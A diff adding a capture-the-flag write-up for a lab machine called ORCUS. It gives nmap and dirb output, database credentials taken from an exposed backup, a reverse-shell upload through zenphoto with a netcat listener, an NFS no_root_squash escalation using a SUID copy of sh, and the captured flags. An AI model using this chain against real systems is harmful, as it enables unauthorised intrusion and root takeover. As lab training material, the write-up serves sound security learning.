@@ -1,0 +1,215 @@
+Recon Phase :
+
+$ nmap -p 1-65535 -T4 -A -v 172.16.34.157
+
+////////////////////////////////////////////////////////////////////////////////
+22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 3a:48:6e:8e:3f:32:26:f8:b6:a1:c6:b1:70:73:37:75 (RSA)
+|_  256 04:55:e6:48:50:d6:93:d7:12:80:a0:68:bc:97:fa:33 (ECDSA)
+53/tcp    open  domain      ISC BIND 9.10.3-P4-Ubuntu
+| dns-nsid:
+|_  bind.version: 9.10.3-P4-Ubuntu
+80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 30 disallowed entries (15 shown)
+| /exponent.js.php /exponent.js2.php /exponent.php
+| /exponent_bootstrap.php /exponent_constants.php /exponent_php_setup.php
+| /exponent_version.php /getswversion.php /login.php /overrides.php
+| /popup.php /selector.php /site_rss.php /source_selector.php
+|_/thumb.php
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+110/tcp   open  pop3        Dovecot pop3d
+|_pop3-capabilities: UIDL AUTH-RESP-CODE SASL STLS PIPELINING CAPA RESP-CODES TOP
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Issuer: commonName=localhost/organizationName=Dovecot mail server
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2016-10-09T03:44:10
+| Not valid after:  2026-10-09T03:44:10
+| MD5:   ad50 6e67 26f1 7969 4bcd 2696 5347 a592
+|_SHA-1: 01e5 ecc7 994a a19d 45e8 f4c2 b4cf 98b5 10a4 771f
+|_ssl-date: TLS randomness does not represent time
+111/tcp   open  rpcbind     2-4 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      44330/udp  mountd
+|   100005  1,2,3      50170/tcp  mountd
+|   100021  1,3,4      33809/udp  nlockmgr
+|   100021  1,3,4      42333/tcp  nlockmgr
+|   100227  2,3         2049/tcp  nfs_acl
+|_  100227  2,3         2049/udp  nfs_acl
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp   open  imap        Dovecot imapd
+|_imap-capabilities: more LITERAL+ ENABLE post-login IDLE STARTTLS IMAP4rev1 LOGIN-REFERRALS listed SASL-IR OK Pre-login LOGINDISABLEDA0001 capabilities have ID
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Issuer: commonName=localhost/organizationName=Dovecot mail server
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2016-10-09T03:44:10
+| Not valid after:  2026-10-09T03:44:10
+| MD5:   ad50 6e67 26f1 7969 4bcd 2696 5347 a592
+|_SHA-1: 01e5 ecc7 994a a19d 45e8 f4c2 b4cf 98b5 10a4 771f
+|_ssl-date: TLS randomness does not represent time
+443/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 3a:48:6e:8e:3f:32:26:f8:b6:a1:c6:b1:70:73:37:75 (RSA)
+|_  256 04:55:e6:48:50:d6:93:d7:12:80:a0:68:bc:97:fa:33 (ECDSA)
+445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+993/tcp   open  ssl/imap    Dovecot imapd
+|_imap-capabilities: LITERAL+ more ENABLE post-login listed IMAP4rev1 LOGIN-REFERRALS AUTH=PLAINA0001 SASL-IR OK Pre-login IDLE capabilities have ID
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Issuer: commonName=localhost/organizationName=Dovecot mail server
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2016-10-09T03:44:10
+| Not valid after:  2026-10-09T03:44:10
+| MD5:   ad50 6e67 26f1 7969 4bcd 2696 5347 a592
+|_SHA-1: 01e5 ecc7 994a a19d 45e8 f4c2 b4cf 98b5 10a4 771f
+|_ssl-date: TLS randomness does not represent time
+995/tcp   open  ssl/pop3    Dovecot pop3d
+|_pop3-capabilities: UIDL AUTH-RESP-CODE USER SASL(PLAIN) PIPELINING CAPA RESP-CODES TOP
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Issuer: commonName=localhost/organizationName=Dovecot mail server
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2016-10-09T03:44:10
+| Not valid after:  2026-10-09T03:44:10
+| MD5:   ad50 6e67 26f1 7969 4bcd 2696 5347 a592
+|_SHA-1: 01e5 ecc7 994a a19d 45e8 f4c2 b4cf 98b5 10a4 771f
+|_ssl-date: TLS randomness does not represent time
+2049/tcp  open  nfs_acl     2-3 (RPC #100227)
+34625/tcp open  mountd      1-3 (RPC #100005)
+42333/tcp open  nlockmgr    1-4 (RPC #100021)
+50170/tcp open  mountd      1-3 (RPC #100005)
+51573/tcp open  mountd      1-3 (RPC #100005)
+MAC Address: 00:0C:29:1C:55:F8 (VMware)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.6
+Uptime guess: 198.840 days (since Wed Aug 31 13:19:18 2016)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=257 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: Host: ORCUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 30s, deviation: 0s, median: 30s
+| nbstat: NetBIOS name: ORCUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| Names:
+|   ORCUS<00>            Flags: <unique><active>
+|   ORCUS<03>            Flags: <unique><active>
+|   ORCUS<20>            Flags: <unique><active>
+|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
+|   WORKGROUP<00>        Flags: <group><active>
+|   WORKGROUP<1d>        Flags: <unique><active>
+|_  WORKGROUP<1e>        Flags: <group><active>
+| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: \x00
+|   NetBIOS computer name: ORCUS\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2017-03-18T03:27:29-04:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server supports SMBv2 protocol
+////////////////////////////////////////////////////////////////////////////////
+$ dirb http://172.16.34.157 /usr/share/wordlists/dirb/big.txt
+
+    ==> DIRECTORY: http://172.16.34.157/admin/
+    ==> DIRECTORY: http://172.16.34.157/backups/
+    ==> DIRECTORY: http://172.16.34.157/cron/
+    ==> DIRECTORY: http://172.16.34.157/external/
+    ==> DIRECTORY: http://172.16.34.157/FCKeditor/
+    ==> DIRECTORY: http://172.16.34.157/files/
+    ==> DIRECTORY: http://172.16.34.157/framework/
+    ==> DIRECTORY: http://172.16.34.157/install/
+    ==> DIRECTORY: http://172.16.34.157/javascript/
+    ==> DIRECTORY: http://172.16.34.157/phpmyadmin/
+    ==> DIRECTORY: http://172.16.34.157/themes/
+    ==> DIRECTORY: http://172.16.34.157/zenphoto/
+    ==> DIRECTORY: http://172.16.34.157/tmp/
+
+then i downloaded and extract http://172.16.34.157/backups/SimplePHPQuiz-Backupz.tar.gz
+$ cat include/db_conn.php
+    <?php
+
+    //Set the database access information as constants
+    DEFINE ('DB_USER', 'dbuser');
+    DEFINE ('DB_PASSWORD', 'dbpassword');
+    DEFINE ('DB_HOST', 'localhost');
+    DEFINE ('DB_NAME', 'quizdb');
+
+    @ $dbc = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
+
+    if (mysqli_connect_error()){
+    	echo "Could not connect to MySql. Please try again";
+    	exit();
+    }
+
+    ?>
+================================================================================
+Attacking Phase:
+
+Then i tried the username and password with http://172.16.34.157/phpmyadmin/
+then i tried to access ans setup zenphoto via http://172.16.34.157/zenphoto
+then i got to upload a compressed reverse shell file (.zip)
+from my local machine
+$ nc -lp 1234
+and from browser 172.16.34.157/zenphoto/albums/zip/shell.php
+and from nc i got a shell
+$ cat /var/www/flag.txt
+868c889965b7ada547fae81f922e45c4 --> First Flag
+================================================================================
+Priv esc
+i downloaded and executed linux-local-enum.sh
+and i noticed in /etc/exports
+    # /etc/exports: the access control list for filesystems which may be exported
+    #		to NFS clients.  See exports(5).
+    #
+    # Example for NFSv2 and NFSv3:
+    # /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+    #
+    # Example for NFSv4:
+    # /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+    # /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+    #
+    /tmp *(rw,no_root_squash)
+
+"no_root_squash - Allows root users on client computers to have root access on the server."
+from Orcus's shell
+$ cp /bin/sh /tmp/
+then from my local machine
+$ showmount -e 172.16.34.157
+    Export list for 172.16.34.157:
+    /tmp *
+$ mount -t nfs -o nolock 172.16.34.157:/tmp /media/tmp
+$ cd /media/tmp
+$ cat ./sh > shell
+$ chmod 4777 shell
+
+From Orcus's shell
+$ ./shell -p
+$ id
+    uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+$ cat /root/flag.txt
+    807307b49314f822985d0410de7d8bfe --> Second Flag
+================================================================================
+The third flag is in /etc/kippo/data/userdb.txt
+$ cat /etc/kippo/data/userdb.txt
+    root:0:123456
+    fakuser:1:TH!SP4SSW0RDIS4Fl4G! --> Third Flag
